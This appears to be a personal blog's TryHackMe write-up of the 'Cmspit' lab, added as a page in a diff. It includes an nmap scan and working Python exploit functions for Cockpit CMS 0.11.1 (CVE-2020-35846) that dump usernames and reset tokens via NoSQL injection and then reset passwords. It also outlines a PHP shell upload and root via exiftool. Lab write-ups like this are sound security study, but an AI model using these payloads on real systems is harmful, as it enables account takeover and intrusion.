@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Cmspit">
+  <meta property="og:description" content="Tryhackme - Medium">
+  <meta property="og:image" content="/assets/img/profile.png">
+
+  <title>Cmspit</title>
+  <meta name="description" content="Tryhackme - Medium">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Akshay Chavan</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto">
+<a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Cmspit</b></h1>
+
+<p class="post-metadata text-muted">
+  09 November 2023 -  
+  <b>6 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#nosqlinjection">
+      <span class="tag badge badge-pill text-primary border border-primary">NoSQLInjection</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#passwordresetabuse">
+      <span class="tag badge badge-pill text-primary border border-primary">PasswordResetAbuse</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#suid">
+      <span class="tag badge badge-pill text-primary border border-primary">SUID</span>
+    </a>
+    </p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/af878fdc94fd054dd34b05b7977a6c09.png" alt="infocard"></p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-scan"><strong>Nmap Scan</strong></h3>
+
+<p>The first step in our attack is scanning the target system using Nmap, a powerful network scanning tool that helps identify open ports and running services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 11:09 EST
+Nmap scan report for 10.10.29.223
+Host is up (0.32s latency).
+
+PORT   STATE SERVICE  VERSION
+22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
+|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
+|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
+80/tcp open  ssl/http Apache/2.4.18 (Ubuntu)
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-title: Authenticate Please!
+|_Requested resource was /auth/login?to=/
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds
+</code></pre></div></div>
+
+<p>From this scan, we can see two services running:</p>
+
+<ul>
+  <li>
+<strong>SSH (Port 22)</strong>: OpenSSH 7.2p2</li>
+  <li>
+<strong>HTTP (Port 80)</strong>: Apache/2.4.18 with a login page</li>
+</ul>
+
+<p>Since web applications are often more vulnerable than SSH, we focus our attack on the HTTP service.</p>
+
+<h3 id="exploring-the-http-service"><strong>Exploring the HTTP Service</strong></h3>
+
+<h4 id="identifying-the-cms"><strong>Identifying the CMS</strong></h4>
+
+<p>Upon navigating to the IP address in a browser, we encounter a login page. Upon further inspection, we identify the Content Management System (CMS) in use: <strong>Cockpit CMS</strong>.</p>
+
+<p><img src="/assets/ctf/media/login.png" alt="login"></p>
+
+<p>Checking the page source reveals the CMS version: <strong>0.11.1</strong>.</p>
+
+<p><img src="/assets/ctf/media/version.png" alt="version"></p>
+
+<h4 id="searching-for-exploits"><strong>Searching for Exploits</strong></h4>
+
+<p>Using <code class="language-plaintext highlighter-rouge">searchsploit</code>, a tool for quickly searching available exploits in the Exploit-DB repository, we find a relevant exploit for Cockpit CMS 0.11.1.</p>
+
+<p><img src="/assets/ctf/media/searchsploit.png" alt="searchsploit"></p>
+
+<p>This exploit allows us to enumerate usernames and reset passwords using a <strong>NoSQL Injection vulnerability</strong>.</p>
+
+<h3 id="exploiting-cockpit-cms"><strong>Exploiting Cockpit CMS</strong></h3>
+
+<p>Before executing the exploit, let’s understand its working.</p>
+
+<p>The vulnerability is in the <code class="language-plaintext highlighter-rouge">/auth/check</code> endpoint, where the <code class="language-plaintext highlighter-rouge">user</code> parameter is not validated properly. This flaw allows us to pass arbitrary objects that get parsed by MongoDB, effectively manipulating the query execution.</p>
+
+<p><img src="https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_authenticate_src.png" alt="code"></p>
+
+<h4 id="username-enumeration">Username Enumeration**</h4>
+
+<p>We send a crafted request to <code class="language-plaintext highlighter-rouge">/auth/requestreset</code> using the <code class="language-plaintext highlighter-rouge">var_dump</code> function to list usernames.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">re</span>
+
+<span class="k">def</span> <span class="nf">enumerate_users</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Attempting Username Enumeration (CVE-2020-35846) : </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/auth/requestreset"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"user"</span><span class="p">:</span> <span class="p">{</span><span class="s">"$func"</span><span class="p">:</span> <span class="s">"var_dump"</span><span class="p">}}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">'string\(\d{1,2}\)\s*"([\w-]+)"'</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Users Found : "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">matches</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">matches</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"No users found"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Executing the script returns the usernames:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li><code class="language-plaintext highlighter-rouge">sdarkStar7471</code></li>
+  <li><code class="language-plaintext highlighter-rouge">skidy</code></li>
+  <li><code class="language-plaintext highlighter-rouge">ekoparty</code></li>
+</ul>
+
+<p><img src="/assets/ctf/media/user_dump.png" alt="user_dump"></p>
+
+<h4 id="extracting-password-reset-tokens">Extracting Password Reset Tokens**</h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">/auth/resetpassword</code> endpoint allows password reset if a valid token is provided. However, since the <code class="language-plaintext highlighter-rouge">token</code> parameter is also unfiltered, we can extract all valid reset tokens.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">re</span>
+
+<span class="k">def</span> <span class="nf">reset_tokens</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Finding Password Reset Tokens"</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/auth/resetpassword"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"token"</span><span class="p">:</span> <span class="p">{</span><span class="s">"$func"</span><span class="p">:</span> <span class="s">"var_dump"</span><span class="p">}}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="sa">r</span><span class="s">'string\(\d{1,2}\)\s*"([\w-]+)"'</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="n">matches</span> <span class="o">=</span> <span class="n">pattern</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">matches</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Tokens Found: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">matches</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">matches</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"No tokens found"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="resetting-password">Resetting Password**</h4>
+
+<p>Using the extracted token, we can reset a user’s password:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">json</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span>
+
+<span class="k">def</span> <span class="nf">password_reset</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">user</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Attempting to reset %s's password:"</span> <span class="o">%</span> <span class="n">user</span><span class="p">)</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/auth/resetpassword"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"token"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s">"success"</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Password Updated Successfully!"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] The New Credentials: </span><span class="se">\n</span><span class="s"> </span><span class="se">\t</span><span class="s"> Username : %s </span><span class="se">\n</span><span class="s"> </span><span class="se">\t</span><span class="s"> Password : %s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>With the new credentials, we log in and upload a PHP shell to gain access as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<p><img src="/assets/ctf/media/wwwdata.png" alt="wwwdata"></p>
+
+<h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2>
+
+<h4 id="gaining-higher-privileges"><strong>Gaining Higher Privileges</strong></h4>
+
+<p>We find a user named <code class="language-plaintext highlighter-rouge">stux</code>, and inside their home directory, a <code class="language-plaintext highlighter-rouge">.dbshell</code> file containing their password.</p>
+
+<p>Using this password, we switch to <code class="language-plaintext highlighter-rouge">stux</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stux@ubuntu:~<span class="nv">$ </span><span class="nb">whoami
+</span>stux
+</code></pre></div></div>
+
+<h4 id="root-privileges-via-exiftool-exploit"><strong>Root Privileges via ExifTool Exploit</strong></h4>
+
+<p><code class="language-plaintext highlighter-rouge">stux</code> can execute <code class="language-plaintext highlighter-rouge">exiftool</code> as root, which is vulnerable to <code class="language-plaintext highlighter-rouge">CVE-2021-22204</code>. Exploiting this vulnerability gives us a root shell.</p>
+
+<p><img src="/assets/ctf/media/dejavu.png" alt="dejavu"></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:~# <span class="nb">whoami
+</span>root
+</code></pre></div></div>
+
+<h2 id="resources"><strong>Resources</strong></h2>
+
+<ul>
+  <li><a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">From 0 to RCE: Cockpit CMS</a></li>
+  <li><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">CVE-2021-22204: ExifTool RCE</a></li>
+</ul>
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Akshay Chavan</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center">
+<a class="social mx-1" href="mailto:akschavan100@gmail.com" style="color: #6c757d" onmouseover="this.style.color='#db4437'" onmouseout="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.github.com/akshaychavan10" style="color: #6c757d" onmouseover="this.style.color='#333333'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1" href="https://www.linkedin.com/in/akshaychavan07" style="color: #6c757d" onmouseover="this.style.color='#007bb5'" onmouseout="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div>
+<small id="attribution">
+    theme <a href="https://github.com/yousinix/portfolYOU">portfolYOU</a>
+  </small>
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
